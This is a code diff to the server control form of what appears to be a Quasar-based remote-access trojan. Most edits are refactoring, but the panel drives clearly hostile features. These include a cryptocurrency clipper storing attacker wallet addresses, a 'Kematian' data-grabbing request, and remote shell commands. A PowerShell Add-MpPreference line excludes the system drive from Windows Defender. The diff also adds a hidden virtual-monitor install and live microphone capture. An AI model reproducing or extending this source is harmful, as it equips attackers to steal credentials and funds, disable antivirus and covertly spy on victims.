@@ -26,6 +26,7 @@ using System.IO;
 using System.Text.Json;
 using System.Drawing;
 using System.Xml;
+using Quasar.Common.Messages.Monitoring.VirtualMonitor;
 
 namespace Quasar.Server.Forms
 {
@@ -285,12 +286,15 @@ namespace Quasar.Server.Forms
                         else
                             logColor = Color.Black;
                         break;
+
                     case "info":
                         logColor = Color.DodgerBlue;
                         break;
+
                     case "error":
                         logColor = Color.Red;
                         break;
+
                     default:
                         logColor = Color.DodgerBlue;
                         break;
@@ -349,7 +353,7 @@ namespace Quasar.Server.Forms
                     _previewImageHandler.Dispose();
                 }
 
-                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, listView1);
+                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
                 MessageHandler.Register(_previewImageHandler);
 
                 GetPreviewImage image = new GetPreviewImage
@@ -366,27 +370,31 @@ namespace Quasar.Server.Forms
                 tableLayoutPanel1.Visible = false;
                 pictureBoxMain.Image = Properties.Resources.no_previewbmp;
 
-                listView1.Items.Clear();
+                clientInfoListView.Items.Clear();
 
                 var cpuItem = new ListViewItem("CPU");
                 cpuItem.SubItems.Add("N/A");
-                listView1.Items.Add(cpuItem);
+                clientInfoListView.Items.Add(cpuItem);
 
                 var gpuItem = new ListViewItem("GPU");
                 gpuItem.SubItems.Add("N/A");
-                listView1.Items.Add(gpuItem);
+                clientInfoListView.Items.Add(gpuItem);
 
                 var ramItem = new ListViewItem("RAM");
                 ramItem.SubItems.Add("0 GB");
-                listView1.Items.Add(ramItem);
+                clientInfoListView.Items.Add(ramItem);
 
                 var uptimeItem = new ListViewItem("Uptime");
                 uptimeItem.SubItems.Add("N/A");
-                listView1.Items.Add(uptimeItem);
+                clientInfoListView.Items.Add(uptimeItem);
 
                 var antivirusItem = new ListViewItem("Antivirus");
                 antivirusItem.SubItems.Add("N/A");
-                listView1.Items.Add(antivirusItem);
+                clientInfoListView.Items.Add(antivirusItem);
+
+                var mainBrowserItem = new ListViewItem("Main Browser");
+                mainBrowserItem.SubItems.Add("N/A");
+                clientInfoListView.Items.Add(mainBrowserItem);
             }
         }
 
@@ -490,6 +498,7 @@ namespace Quasar.Server.Forms
                             if (Settings.ShowPopup)
                                 ShowPopup(client.Key);
                             break;
+
                         case false:
                             RemoveClientFromListview(client.Key);
                             break;
@@ -517,12 +526,15 @@ namespace Quasar.Server.Forms
                     case "Remote Execute":
                         new FileManagerHandler(client).BeginUploadFile(subItem0, "");
                         break;
+
                     case "Shell Command":
                         client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
                         break;
+
                     case "Kematian Recovery":
                         new KematianHandler(client).RequestKematianZip();
                         break;
+
                     case "Exclude System Drives":
                     string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
@@ -530,6 +542,7 @@ namespace Quasar.Server.Forms
                             client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                         }
                         break;
+
                     case "Message Box":
                     client.Send(new DoShowMessageBox
                     {
@@ -575,24 +588,25 @@ namespace Quasar.Server.Forms
 
         private void UpdateCryptoAddressesJson()
         {
-            var data = new
+            Dictionary<string, object> data = new Dictionary<string, object>();
+
+            Dictionary<string, string> addresses = new Dictionary<string, string>
             {
-                Addresses = new Dictionary<string, string>
-                {
-                    { "BTC", BTCTextBox.Text },
-                    { "LTC", LTCTextBox.Text },
-                    { "ETH", ETHTextBox.Text },
-                    { "XMR", XMRTextBox.Text },
-                    { "SOL", SOLTextBox.Text },
-                    { "DASH", DASHTextBox.Text },
-                    { "XRP", XRPTextBox.Text },
-                    { "TRX", TRXTextBox.Text },
-                    { "BCH", BCHTextBox.Text }
-                },
-                ClipperEnabled = ClipperCheckbox.Checked
+                { "BTC", BTCTextBox.Text },
+                { "LTC", LTCTextBox.Text },
+                { "ETH", ETHTextBox.Text },
+                { "XMR", XMRTextBox.Text },
+                { "SOL", SOLTextBox.Text },
+                { "DASH", DASHTextBox.Text },
+                { "XRP", XRPTextBox.Text },
+                { "TRX", TRXTextBox.Text },
+                { "BCH", BCHTextBox.Text }
             };
 
-            string json = JsonSerializer.Serialize(data, new JsonSerializerOptions { WriteIndented = true });
+            data["Addresses"] = addresses;
+            data["ClipperEnabled"] = ClipperCheckbox.Checked;
+
+            string json = Newtonsoft.Json.JsonConvert.SerializeObject(data, Newtonsoft.Json.Formatting.Indented);
             string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crypto_addresses.json");
 
             File.WriteAllText(filePath, json);
@@ -606,11 +620,13 @@ namespace Quasar.Server.Forms
                 try
                 {
                     string json = File.ReadAllText(filePath);
-                    var data = JsonSerializer.Deserialize<Dictionary<string, object>>(json);
+                    var data = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
 
                     if (data != null)
                     {
-                        var addresses = JsonSerializer.Deserialize<Dictionary<string, string>>(data["Addresses"].ToString());
+                        var addressesJson = data["Addresses"].ToString();
+                        var addresses = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(addressesJson);
+
                         if (addresses != null)
                         {
                             BTCTextBox.Text = addresses.ContainsKey("BTC") ? addresses["BTC"] : string.Empty;
@@ -624,7 +640,7 @@ namespace Quasar.Server.Forms
                             BCHTextBox.Text = addresses.ContainsKey("BCH") ? addresses["BCH"] : string.Empty;
                         }
 
-                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && ConvertJsonBool(data["ClipperEnabled"]);
+                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && Convert.ToBoolean(data["ClipperEnabled"]);
                     }
                 }
                 catch (Exception ex)
@@ -641,23 +657,7 @@ namespace Quasar.Server.Forms
             }
         }
 
-        private bool ConvertJsonBool(object jsonElement)
-        {
-            if (jsonElement is JsonElement element1 && element1.ValueKind == JsonValueKind.True)
-            {
-                return true;
-            }
-            else if (jsonElement is JsonElement element2 && element2.ValueKind == JsonValueKind.False)
-            {
-                return false;
-            }
-            else
-            {
-                throw new InvalidOperationException("Invalid JSON boolean value.");
-            }
-        }
-
-        #endregion
+        #endregion "Crypto Addresses"
 
         private void RefreshStarButtons()
         {
@@ -1017,7 +1017,7 @@ namespace Quasar.Server.Forms
             }
         }
 
-        #endregion
+        #endregion "Client Management"
 
         #region "Administration"
 
@@ -1148,7 +1148,7 @@ namespace Quasar.Server.Forms
             }
         }
 
-        #endregion
+        #endregion "Administration"
 
         #region "Monitoring"
 
@@ -1192,15 +1192,6 @@ namespace Quasar.Server.Forms
             }
         }
 
-        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                var kematianHandler = new KematianHandler(c);
-                kematianHandler.RequestKematianZip();
-            }
-        }
-
         private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1211,7 +1202,33 @@ namespace Quasar.Server.Forms
             }
         }
 
-        #endregion
+        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var kematianHandler = new KematianHandler(c);
+                kematianHandler.RequestKematianZip();
+            }
+        }
+
+        private void installVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //check if client is admin
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+                if (isClientAdmin)
+                {
+                    c.Send(new DoInstallVirtualMonitor());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        #endregion "Monitoring"
 
         #region "User Support"
 
@@ -1259,7 +1276,7 @@ namespace Quasar.Server.Forms
             }
         }
 
-        #endregion
+        #endregion "User Support"
 
         #region "Quick Commands"
 
@@ -1283,9 +1300,10 @@ namespace Quasar.Server.Forms
             }
         }
 
-        #endregion
+        #endregion "Quick Commands"
 
         #region "Fun Stuff"
+
         private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1318,14 +1336,14 @@ namespace Quasar.Server.Forms
             }
         }
 
-        #endregion
+        #endregion "Fun Stuff"
 
         private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             lstClients.SelectAllItems();
         }
 
-        #endregion
+        #endregion "ContextMenuStrip"
 
         #region "MenuStrip"
 
@@ -1362,7 +1380,7 @@ namespace Quasar.Server.Forms
             }
         }
 
-        #endregion
+        #endregion "MenuStrip"
 
         #region "NotifyIcon"
 
@@ -1370,7 +1388,7 @@ namespace Quasar.Server.Forms
         {
         }
 
-        #endregion
+        #endregion "NotifyIcon"
 
         private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
         {
@@ -1567,13 +1585,21 @@ namespace Quasar.Server.Forms
         }
 
         public string GetBTCAddress() => BTCTextBox.Text;
+
         public string GetLTCAddress() => LTCTextBox.Text;
+
         public string GetETHAddress() => ETHTextBox.Text;
+
         public string GetXMRAddress() => XMRTextBox.Text;
+
         public string GetSOLAddress() => SOLTextBox.Text;
+
         public string GetDASHAddress() => DASHTextBox.Text;
+
         public string GetXRPAddress() => XRPTextBox.Text;
+
         public string GetTRXAddress() => TRXTextBox.Text;
+
         public string GetBCHAddress() => BCHTextBox.Text;
 
         private void taskTestToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1734,8 +1760,6 @@ namespace Quasar.Server.Forms
         private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
         {
             e.DrawDefault = true;
-     
-        
         }
 
         private void remoteScriptingToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1757,6 +1781,16 @@ namespace Quasar.Server.Forms
                         }
                     }
                 }
+            }
+        }
+
+        private void audioToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmAudio = FrmRemoteMic.CreateNewOrGetExisting(c);
+                frmAudio.Show();
+                frmAudio.Focus();
             }
         }
     }
